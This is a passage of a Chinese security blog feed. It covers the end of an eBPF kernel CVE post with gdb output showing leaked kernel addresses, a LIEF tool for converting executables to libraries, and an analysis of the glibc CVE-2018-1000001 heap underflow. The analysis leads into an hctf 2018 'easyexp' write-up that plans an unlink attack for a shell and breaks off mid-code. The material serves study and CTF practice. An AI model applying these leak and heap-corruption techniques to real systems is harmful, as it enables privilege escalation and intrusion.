<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  p&#x2F;a *(struct bpf_array *)0xffff88800d878000              </span><br><span class="line">$5 &#x3D; &#123;  </span><br><span class="line">  map &#x3D; &#123;          </span><br><span class="line">    ops &#x3D; 0xffffffff82016340 &lt;array_map_ops&gt;,&#x2F;&#x2F; &lt;-- 泄露内核地址</span><br><span class="line">    inner_map_meta &#x3D; 0x0 &lt;fixed_percpu_data&gt;,</span><br><span class="line">    security &#x3D; 0xffff88800e93f0f8,</span><br><span class="line">    map_type &#x3D; 0x2 &lt;fixed_percpu_data+2&gt;,</span><br><span class="line">    key_size &#x3D; 0x4 &lt;fixed_percpu_data+4&gt;,</span><br><span class="line">    value_size &#x3D; 0x2000 &lt;irq_stack_backing_store&gt;, </span><br><span class="line">    max_entries &#x3D; 0x1 &lt;fixed_percpu_data+1&gt;,</span><br><span class="line">&#x2F;&#x2F;...    </span><br><span class="line">    usercnt &#x3D; &#123;    </span><br><span class="line">&#x2F;&#x2F;..</span><br><span class="line">      wait_list &#x3D; &#123;</span><br><span class="line">        next &#x3D; 0xffff88800d8780c0,&#x2F;&#x2F; &lt;-- 泄露 map 地址</span><br><span class="line">        prev &#x3D; 0xffff88800d8780c0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    writecnt &#x3D; 0x0 &lt;fixed_percpu_data&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  elem_size &#x3D; 0x2000 &lt;irq_stack_backing_store&gt;,</span><br><span class="line">  index_mask &#x3D; 0x0 &lt;fixed_percpu_data&gt;,</span><br><span class="line">  aux &#x3D; 0x0 &lt;fixed_percpu_data&gt;,</span><br><span class="line">  &#123;</span><br><span class="line">    value &#x3D; 0xffff88800d878110,&#x2F;&#x2F; &lt;-- r7</span><br><span class="line">    ptrs &#x3D; 0xffff88800d878110,</span><br><span class="line">    pptrs &#x3D; 0xffff88800d878110</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-5-漏洞修复"><a href="#2-5-漏洞修复" class="headerlink" title="2.5 漏洞修复"></a>2.5 漏洞修复</h3><p>删除了引入的*__reg_bound_offset32()*。</p>
<blockquote>
<p>参考资料：</p>
<p><a href="https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html">https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html</a></p>
<p><a href="https://www.anquanke.com/post/id/203416">https://www.anquanke.com/post/id/203416</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>cve</tag>
        <tag>ebpf</tag>
      </tags>
  </entry>
  <entry>
    <title>【工具】将Linux下executable转为lib的探究</title>
    <url>/2019/08/05/exe2lib-in-linux/</url>
    <content><![CDATA[<p>关于如何将PIE的executable转为lib并通过C加载执行特定函数。</p>
<a id="more"></a>

<blockquote>
<p>参考文章：</p>
<p><a href="https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/">https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/</a></p>
<p><a href="https://lief.quarkslab.com/doc/latest/tutorials/08_elf_bin2lib.html">https://lief.quarkslab.com/doc/latest/tutorials/08_elf_bin2lib.html</a></p>
</blockquote>
<h3 id="LIEF"><a href="#LIEF" class="headerlink" title="LIEF"></a>LIEF</h3><p>LIEF提供了将bin转为lib的一种方法，需要bin打开了PIE，没开PIE的bin无法转为lib。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lief, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># usage: python3 exe2so.py bin addr:export_name ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">&quot;[-] invalid syntax&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">infile = sys.argv[<span class="number">1</span>]</span><br><span class="line">elf = lief.parse(infile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> sys.argv[<span class="number">2</span>:]:</span><br><span class="line">    addr, name = arg.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    addr = int(addr, <span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] exporting &#x27;%s&#x27; to %#x&quot;</span> % (name, addr,))</span><br><span class="line">    elf.add_exported_function(addr, name)</span><br><span class="line"></span><br><span class="line">outfile = <span class="string">&quot;%s.so&quot;</span> % infile</span><br><span class="line">print(<span class="string">&quot;[+] writing shared object as &#x27;%s&#x27;&quot;</span> % (outfile,))</span><br><span class="line">elf.write(outfile)</span><br><span class="line">print(<span class="string">&quot;[+] done&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="使用C语言调用"><a href="#使用C语言调用" class="headerlink" title="使用C语言调用"></a>使用C语言调用</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;alloca.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">size_t</span><span class="params">(*<span class="keyword">func_t</span>)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> is_loaded = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span>* h = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CloseLibrary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(h) &#123;</span><br><span class="line">                dlclose(h);</span><br><span class="line">                h = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LoadLibrary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        h = dlopen(<span class="string">&quot;./bin.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">        atexit(CloseLibrary);</span><br><span class="line">        <span class="keyword">return</span> h != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_loaded) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!LoadLibrary()) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Load Error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        is_loaded = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Load Success\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">func_t</span> func = (<span class="keyword">func_t</span>)dlsym(h, <span class="string">&quot;export_name&quot;</span>);</span><br><span class="line"></span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>linux</tag>
        <tag>ctf</tag>
        <tag>tool</tag>
        <tag>elf</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>Happy 2019 Chinese New Year</title>
    <url>/2019/02/05/happy-2019-chinese-new-year/</url>
    <content><![CDATA[<p>猪年（己亥年）快乐！</p>
]]></content>
      <tags>
        <tag>2019</tag>
        <tag>happy</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE–2018-1000001 &amp; hctf 2018 easyexp</title>
    <url>/2018/11/16/hctf18-easyexp/</url>
    <content><![CDATA[<p>做题的时候有考虑过CVE，但当时没去查……</p>
<h2 id="CVE–2018-1000001"><a href="#CVE–2018-1000001" class="headerlink" title="CVE–2018-1000001"></a>CVE–2018-1000001</h2><p>该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。</p>
<p>以下分析<code>stdlib/canonicalize.c</code>中的<code>__realpath()</code>函数（<code>__canonicalize_file_name</code>仅仅调用<code>__realpath()</code>，没有其它操作）。</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Return the canonical absolute name of a given file.</span></span><br><span class="line"><span class="comment">   Copyright (C) 1996-2016 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="comment">   This file is part of the GNU C Library.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The GNU C Library is free software; you can redistribute it and/or</span></span><br><span class="line"><span class="comment">   modify it under the terms of the GNU Lesser General Public</span></span><br><span class="line"><span class="comment">   License as published by the Free Software Foundation; either</span></span><br><span class="line"><span class="comment">   version 2.1 of the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The GNU C Library is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">   but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span></span><br><span class="line"><span class="comment">   Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   You should have received a copy of the GNU Lesser General Public</span></span><br><span class="line"><span class="comment">   License along with the GNU C Library; if not, see</span></span><br><span class="line"><span class="comment">   &lt;http://www.gnu.org/licenses/&gt;.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eloop-threshold.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlib-compat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return the canonical absolute name of file NAME.  A canonical name</span></span><br><span class="line"><span class="comment">   does not contain any `.&#x27;, `..&#x27; components nor any repeated path</span></span><br><span class="line"><span class="comment">   separators (&#x27;/&#x27;) or symlinks.  All path components must exist.  If</span></span><br><span class="line"><span class="comment">   RESOLVED is null, the result is malloc&#x27;d; otherwise, if the</span></span><br><span class="line"><span class="comment">   canonical name is PATH_MAX chars or more, returns null with `errno&#x27;</span></span><br><span class="line"><span class="comment">   set to ENAMETOOLONG; if the name fits in fewer than PATH_MAX chars,</span></span><br><span class="line"><span class="comment">   returns the name in RESOLVED.  If the name cannot be resolved and</span></span><br><span class="line"><span class="comment">   RESOLVED is non-NULL, it contains the path of the first component</span></span><br><span class="line"><span class="comment">   that cannot be resolved.  If the path can be resolved, RESOLVED</span></span><br><span class="line"><span class="comment">   holds the same value as the value returned.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__realpath (<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">char</span> *resolved) <span class="comment">//name是传入的字符串</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *rpath, *dest, *extra_buf = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *start, *end, *rpath_limit;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> path_max;</span><br><span class="line">  <span class="keyword">int</span> num_links = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 此部分是常规的一些检查，不影响理解代码逻辑</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置path_max参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PATH_MAX</span></span><br><span class="line">  path_max = PATH_MAX;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  path_max = pathconf (name, _PC_PATH_MAX);</span><br><span class="line">  <span class="keyword">if</span> (path_max &lt;= <span class="number">0</span>)</span><br><span class="line">    path_max = <span class="number">1024</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (resolved == <span class="literal">NULL</span>) <span class="comment">// __canonicalize_file_name默认传参NULL</span></span><br><span class="line">    &#123;</span><br><span class="line">      rpath = <span class="built_in">malloc</span> (path_max); <span class="comment">// 申请保存解析后的路径的chunk，发生溢出的即为该chunk</span></span><br><span class="line">      <span class="keyword">if</span> (rpath == <span class="literal">NULL</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    rpath = resolved;</span><br><span class="line">  rpath_limit = rpath + path_max;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!__getcwd (rpath, path_max)) <span class="comment">// getcwd返回rpath的地址</span></span><br><span class="line">	&#123;</span><br><span class="line">	  rpath[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	  <span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line">      dest = __rawmemchr (rpath, <span class="string">&#x27;\0&#x27;</span>); <span class="comment">// dest记录rpath中字符串的结尾</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      rpath[<span class="number">0</span>] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">      dest = rpath + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (start = end = name; *start; start = end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line">      <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Skip sequence of multiple path-separators.  */</span></span><br><span class="line">      <span class="keyword">while</span> (*start == <span class="string">&#x27;/&#x27;</span>) <span class="comment">// 如果以/开头，向后移动</span></span><br><span class="line">	++start;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Find end of path component.  */</span></span><br><span class="line">      <span class="keyword">for</span> (end = start; *end &amp;&amp; *end != <span class="string">&#x27;/&#x27;</span>; ++end)</span><br><span class="line">	<span class="comment">/* Nothing.  */</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (end - start == <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (end - start == <span class="number">1</span> &amp;&amp; start[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">	<span class="comment">/* nothing */</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (end - start == <span class="number">2</span> &amp;&amp; start[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; start[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Back up to previous component, ignore if at root already.  */</span></span><br><span class="line">	  <span class="comment">// dest初始值为rpath中字符串（getcwd返回值）的结尾</span></span><br><span class="line">	  <span class="comment">// 如果遇到..，向前搜索/字符，初始情况下：dest = rpath + len &gt; rpath + 1。所以在第一个..时会在while中出现前向溢出</span></span><br><span class="line">	  <span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span>)</span><br><span class="line">	    <span class="keyword">while</span> ((--dest)[<span class="number">-1</span>] != <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">size_t</span> new_size;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (dest[<span class="number">-1</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">	    *dest++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">      <span class="comment">// 在触发漏洞前，dest已经向前溢出，加上len后不会超过rpath_limit</span></span><br><span class="line">	  <span class="keyword">if</span> (dest + (end - start) &gt;= rpath_limit) <span class="comment">// rpath_limit = rpath + path_max</span></span><br><span class="line">	    &#123;</span><br><span class="line">           <span class="comment">// ...</span></span><br><span class="line">	    &#125;</span><br><span class="line">      <span class="comment">// dest为前溢地址，start为路径../../x处的x的地址，即从路径中拷贝第三个片段到dest中</span></span><br><span class="line">      <span class="comment">// void *mempcpy（void *dest, const void *src, size_t len)</span></span><br><span class="line">	  dest = __mempcpy (dest, start, end - start);</span><br><span class="line">	  *dest = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// __lxstat64可以用来检查rpath指向的文件是否存在，rpath即为(unreachable)/xxxxx</span></span><br><span class="line">	  <span class="keyword">if</span> (__lxstat64 (_STAT_VER, rpath, &amp;st) &lt; <span class="number">0</span>)</span><br><span class="line">	    <span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (S_ISLNK (st.st_mode))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">char</span> *buf = __alloca (path_max);</span><br><span class="line">	      <span class="keyword">size_t</span> len;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (++num_links &gt; __eloop_threshold ())</span><br><span class="line">		&#123;</span><br><span class="line">		  __set_errno (ELOOP);</span><br><span class="line">		  <span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      n = __readlink (rpath, buf, path_max - <span class="number">1</span>);</span><br><span class="line">	      <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	      buf[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (!extra_buf)</span><br><span class="line">		extra_buf = __alloca (path_max);</span><br><span class="line"></span><br><span class="line">	      len = <span class="built_in">strlen</span> (end);</span><br><span class="line">	      <span class="keyword">if</span> ((<span class="keyword">long</span> <span class="keyword">int</span>) (n + len) &gt;= path_max)</span><br><span class="line">		&#123;</span><br><span class="line">		  __set_errno (ENAMETOOLONG);</span><br><span class="line">		  <span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Careful here, end may be a pointer into extra_buf... */</span></span><br><span class="line">	      memmove (&amp;extra_buf[n], end, len + <span class="number">1</span>);</span><br><span class="line">	      name = end = <span class="built_in">memcpy</span> (extra_buf, buf, n);</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">		dest = rpath + <span class="number">1</span>;	<span class="comment">/* It&#x27;s an absolute symlink */</span></span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		<span class="comment">/* Back up to previous component, ignore if at root already: */</span></span><br><span class="line">		<span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span>)</span><br><span class="line">		  <span class="keyword">while</span> ((--dest)[<span class="number">-1</span>] != <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (!S_ISDIR (st.st_mode) &amp;&amp; *end != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      __set_errno (ENOTDIR);</span><br><span class="line">	      <span class="keyword">goto</span> error;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span> &amp;&amp; dest[<span class="number">-1</span>] == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    --dest;</span><br><span class="line">  *dest = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  assert (resolved == <span class="literal">NULL</span> || resolved == rpath);</span><br><span class="line">  <span class="keyword">return</span> rpath;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">  assert (resolved == <span class="literal">NULL</span> || resolved == rpath);</span><br><span class="line">  <span class="keyword">if</span> (resolved == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">free</span> (rpath);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">versioned_symbol (libc, __realpath, realpath, GLIBC_2_3);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__canonicalize_file_name (<span class="keyword">const</span> <span class="keyword">char</span> *name)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __realpath (name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">weak_alias (__canonicalize_file_name, canonicalize_file_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从源代码中可以发现，如果getcwd返回的地址不以/开头的话，就会产生堆的上溢的问题，同时能够向这个上溢的地址写入数据。</p>
<h2 id="easyexp"><a href="#easyexp" class="headerlink" title="easyexp"></a>easyexp</h2><p>本题的原理即<code>__canonicalize_file_name</code>。在本题中，由于程序变更工作目录后，并没有更新当前目录的根目录，因此<code>getcwd()</code> 会在返回的路径前加上<code>(unreachable)</code>，即<code>getcwd()</code>在本题中返回<code>(unreachable)/tmp</code>。随后为了保证程序正常运行，需要通过<code>__lxstat64()</code>的检查，所以需要保证<code>(unreachable)/tmp</code>存在，故将用户名设置为<code>(unreachable)</code>并在该文件夹下创建名为<code>tmp</code>的文件。</p>
<p>由于存在堆上的前溢且程序构造了堆的使用，因此可以修改chunk的<code>pre_inuse</code>，利用<code>unlink</code>获得shell。</p>
<h4 id="程序创建文件的过程"><a href="#程序创建文件的过程" class="headerlink" title="程序创建文件的过程"></a>程序创建文件的过程</h4><p>在程序中定义了如下数据结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FILE_CACHE</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *content;</span><br><span class="line">    <span class="keyword">int</span> content_length;</span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">84</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在bss上存在一个<code>FILE_CACHE[3]</code>数组用于保存相关信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( filename )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(filename, <span class="string">&quot;..&quot;</span>) || *filename == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can&#x27;t go out of tmpfs&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(filename, (<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">0x60</span>LL * i + <span class="number">0x60318C</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;write something:&quot;</span>);</span><br><span class="line">        InputString((__int64)FILE_CACHE[<span class="number">12</span> * i], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)FILE_CACHE[<span class="number">12</span> * i + <span class="number">1</span>]);</span><br><span class="line">        g_idx = (i + <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( FILE_CACHE[<span class="number">12</span> * g_idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      s = fopen((<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">0x60</span>LL * g_idx + <span class="number">0x60318C</span>), <span class="string">&quot;w&quot;</span>);</span><br><span class="line">      fwrite(FILE_CACHE[<span class="number">12</span> * g_idx], <span class="number">1u</span>LL, LODWORD(FILE_CACHE[<span class="number">12</span> * g_idx + <span class="number">1</span>]), s);</span><br><span class="line">      fclose(s);</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)FILE_CACHE[<span class="number">12</span> * g_idx]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(<span class="number">0x60</span>LL * g_idx + <span class="number">0x60318C</span>), filename);</span><br><span class="line">    fd = open(filename, <span class="number">131521</span>, <span class="number">420L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;mkfile:create failed.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write something:&quot;</span>);</span><br><span class="line">    InputString((__int64)&amp;buf, <span class="number">0x1000</span>u);</span><br><span class="line">    write(fd, &amp;buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">    v2 = g_idx;</span><br><span class="line">    FILE_CACHE[<span class="number">12</span> * v2] = strdup(&amp;buf);</span><br><span class="line">    v3 = g_idx;</span><br><span class="line">    LODWORD(FILE_CACHE[<span class="number">12</span> * v3 + <span class="number">1</span>]) = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">    close(fd);</span><br><span class="line">    g_idx = (g_idx + <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上程序位于创建文件的函数中，当用户创建文件时，会现在“缓存”中查找，如果文件名相同或“缓存”未满，则会在“缓存”上保存一份数据，如已满则重置一个“缓存”。这里的结构可以在<code>unlink</code>中进行利用。</p>
<h4 id="程序创建文件夹的过程"><a href="#程序创建文件夹的过程" class="headerlink" title="程序创建文件夹的过程"></a>程序创建文件夹的过程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = *(_DWORD *)v3 + <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *(_QWORD *)&amp;v3[<span class="number">4</span>] = <span class="built_in">strchr</span>(&amp;a1[i], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;v3[<span class="number">4</span>] )</span><br><span class="line">    *(_DWORD *)v3 = *(_DWORD *)&amp;v3[<span class="number">4</span>] - (_DWORD)a1;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_QWORD *)v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;path, <span class="number">0x1000</span>uLL, <span class="string">&quot;%s/%.*s&quot;</span>, cur_work_dir, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v3, a1);</span><br><span class="line">  mkdir(&amp;path, <span class="number">0x1ED</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a1[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)v3] )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ptr = canonicalize_file_name(a1);</span><br><span class="line"><span class="keyword">if</span> ( !ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span 